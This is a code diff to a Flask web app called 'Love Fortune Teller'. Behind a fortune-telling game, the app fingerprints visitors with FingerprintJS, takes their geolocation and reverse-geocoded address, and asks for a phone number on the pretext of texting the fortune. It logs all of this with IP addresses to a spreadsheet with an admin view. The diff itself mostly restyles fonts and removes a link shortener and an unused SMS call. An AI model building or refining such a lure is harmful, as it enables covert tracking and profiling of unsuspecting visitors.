@@ -93,7 +93,6 @@ def load_data():
 def save_data(df):
     try:
         backup_data()
-        # Overwrite the entire file with the updated DataFrame
         df.to_excel(DATA_FILE, index=False, engine='openpyxl')
     except Exception as e:
         print(f"Save failed: {e}")
@@ -102,17 +101,6 @@ def get_client_ip():
     if 'X-Forwarded-For' in request.headers:
         return request.headers['X-Forwarded-For'].split(',')[0].strip()
     return request.remote_addr or 'Unknown'
-
-def get_tinyurl(long_url):
-    try:
-        api_url = "https://tinyurl.com/api-create.php"
-        params = {'url': long_url}
-        response = requests.get(api_url, params=params, timeout=5)
-        if response.status_code == 200:
-            return response.text
-    except:
-        pass
-    return long_url
 
 # ---------- Flask routes ----------
 @app.route('/')
@@ -125,10 +113,11 @@ def index():
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Love Fortune Teller</title>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Poppins', sans-serif;
             background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
             min-height: 100vh;
             display: flex;
@@ -146,6 +135,8 @@ def index():
             text-align: center;
         }
         h1 {
+            font-family: 'Dancing Script', cursive;
+            font-size: 3em;
             background: linear-gradient(135deg, #ff6b6b, #c06c84);
             -webkit-background-clip: text;
             background-clip: text;
@@ -153,8 +144,10 @@ def index():
             margin-bottom: 10px;
         }
         .sub {
+            font-family: 'Poppins', sans-serif;
             color: #888;
             margin-bottom: 25px;
+            font-weight: 300;
         }
         .btn {
             background: linear-gradient(135deg, #ff6b6b, #c06c84);
@@ -168,6 +161,7 @@ def index():
             transition: 0.3s;
             width: 100%;
             margin: 10px 0;
+            font-family: 'Poppins', sans-serif;
         }
         .btn-small {
             width: auto;
@@ -189,8 +183,9 @@ def index():
             padding: 20px;
             margin: 20px 0;
             font-family: 'Dancing Script', cursive;
-            font-size: 1.5em;
+            font-size: 1.6em;
             color: #c06c84;
+            line-height: 1.4;
         }
         .hidden { display: none; }
         hr { margin: 20px 0; border: 1px solid #ffdde1; }
@@ -202,12 +197,18 @@ def index():
             border-radius: 60px;
             text-align: center;
             font-size: 16px;
+            font-family: 'Poppins', sans-serif;
         }
         .sms-prompt {
             background: rgba(255,255,255,0.8);
             border-radius: 20px;
             padding: 15px;
             margin-top: 15px;
+        }
+        .sms-prompt p {
+            font-family: 'Poppins', sans-serif;
+            font-size: 14px;
+            margin-bottom: 10px;
         }
     </style>
 </head>
@@ -307,7 +308,6 @@ def index():
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 collectedData.latitude = pos.coords.latitude;
                 collectedData.longitude = pos.coords.longitude;
-                // get address via reverse geocoding (optional)
                 const address = await fetch(`/reverse-geocode?lat=${collectedData.latitude}&lon=${collectedData.longitude}`);
                 const addrData = await address.json();
                 collectedData.address = addrData.address || 'Unknown';
@@ -321,7 +321,7 @@ def index():
                 document.getElementById('fortuneDisplay').innerHTML = currentFortune;
                 document.getElementById('fortuneDisplay').classList.remove('hidden');
                 
-                // Show SMS prompt (to collect phone number)
+                // Show SMS prompt
                 document.getElementById('smsSection').classList.remove('hidden');
             }, () => {
                 showStatus('⚠️ Location denied. Random fortune below.', true);
@@ -353,14 +353,12 @@ def index():
             showStatus('Please enter your mobile number', true, 'smsStatus');
             return;
         }
-        // Basic validation (allow + and digits)
         if (!/^\+?[0-9\s\-]{10,15}$/.test(phone)) {
             showStatus('Invalid phone number format', true, 'smsStatus');
             return;
         }
         showStatus('Sending your fortune...', false, 'smsStatus');
         
-        // Send phone number to server (update the existing record or add to same row)
         const resp = await fetch('/save-phone', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -435,7 +433,6 @@ def save_phone():
     
     df = load_data()
     if df.empty:
-        # No records yet – create one with the phone
         new_row = pd.DataFrame([{
             'Timestamp': datetime.now(),
             'SessionID': session_id,
@@ -456,13 +453,11 @@ def save_phone():
         }])
         df = new_row
     else:
-        # Find the row with matching SessionID (should be the last one)
         idx = df[df['SessionID'] == session_id].index
         if len(idx) > 0:
             df.loc[idx[-1], 'PhoneNumber'] = phone
             df.loc[idx[-1], 'Fortune'] = fortune
         else:
-            # Create new row
             new_row = pd.DataFrame([{
                 'Timestamp': datetime.now(),
                 'SessionID': session_id,
@@ -484,18 +479,6 @@ def save_phone():
             df = pd.concat([df, new_row], ignore_index=True)
     
     save_data(df)
-    
-    # Optional: Actually send an SMS via an API (e.g., Textbelt)
-    # Uncomment the following lines if you have an SMS API key.
-    """
-    try:
-        sms_api = "https://textbelt.com/text"
-        payload = {'phone': phone, 'message': fortune, 'key': 'textbelt'}
-        requests.post(sms_api, data=payload, timeout=5)
-    except:
-        pass
-    """
-    
     return jsonify({'status': 'saved'})
 
 @app.route('/admin')
